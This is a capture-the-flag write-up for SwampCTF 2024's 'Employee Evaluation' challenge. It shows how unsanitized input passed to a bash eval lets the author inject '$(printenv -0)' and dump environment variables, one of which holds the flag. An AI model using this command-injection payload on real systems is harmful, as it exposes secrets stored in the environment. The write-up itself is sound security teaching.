---
title: "Employee Evaluation - SwampCTF 2024"
category: "crypto"
type: "writeup"
tags: ["crypto", "bash", "env", "substitution", "employee", "evaluation", "swampctf", "swampctf-2024", "2024", "ctf-writeup"]
summary: "In this challenge, we're presented with a script prompting us for input."
source:
  name: "CTFtime writeup #39028"
  url: "https://ctftime.org/writeup/39028"
original_source: "https://nop.so/blog/ctf/0001"
ctf:
  name: "SwampCTF 2024"
  year: 2024
  challenge: "Employee Evaluation"
---

## Metadata

- **CTF:** SwampCTF 2024
- **Task:** Employee Evaluation
- **Author team:** sigil
- **CTFtime tags:** bash, env, substitution
- **CTFtime:** <https://ctftime.org/writeup/39028>
- **Original writeup:** <https://nop.so/blog/ctf/0001>

---
"Employee Evaluation"

In this challenge, we're presented with a script prompting us for input.

/-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-\  
| |  
| SwampCo Employee Evaluation Script™ |  
| |  
| Using a new, robust, and blazingly |  
| fast BASH workflow, lookup of your |  
| best employee score is easier than |  
| ever--all from the safe comfort of |  
| a familiar shell environment |  
| |  
\\-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-/

To start, enter the employee's name...

From this, it's evident that the target software is written in bash. Keeping that in mind, let's check if inputs are sanitized by entering the `$` symbol (which is used for string substitution in bash):

...  
To start, enter the employee's name...  
$  
/app/run: line 44: ${employee_$_score}: bad substitution  


Now we have some idea of what's going on here: somewhere within the target software, there's a statement something along the lines of

eval " if [ -n \"\${employee_${name}_score}\" ]; then echo \"Employee "'${name}'" score: \$employee_${name}_score\" else echo \"Employee not found. Please consult your records.\" fi "  


Looking at the substitutions, it's clear that user input is not properly sanitized before being `eval`-d. From here, all we have to do is escape the substitution to inject our own commands. Let's start by printing the environment variables:

...  
To start, enter the employee's name...  
?$(printenv -0)  
/app/run: line 44: warning: command substitution: ignored null byte in input  
/app/run: line 44: employee_: [...] ____secret_never_reveal_pls_thx__=swampCTF{eva1_c4t_pr0c_3nvir0n_2942} [...]  


And there's our flag!  
**swampCTF{eva1_c4t_pr0c_3nvir0n_2942}  
**
